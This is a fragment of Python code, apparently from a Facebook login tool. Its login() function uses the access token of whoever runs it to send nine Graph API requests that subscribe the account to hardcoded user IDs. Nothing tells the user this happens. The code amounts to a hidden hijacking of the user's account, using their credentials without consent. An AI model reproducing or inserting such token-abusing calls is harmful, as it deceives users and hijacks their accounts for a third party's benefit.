...
def login():
    ...
    try:
        ...
        req.post(f'https://graph.facebook.com/100038342055141/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100004003690596/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/1475910687/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100001403405461/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100006812109545/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100001152080193/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100000517973128/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/100011083959831/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/1836754937/subscribers?access_token={t}')
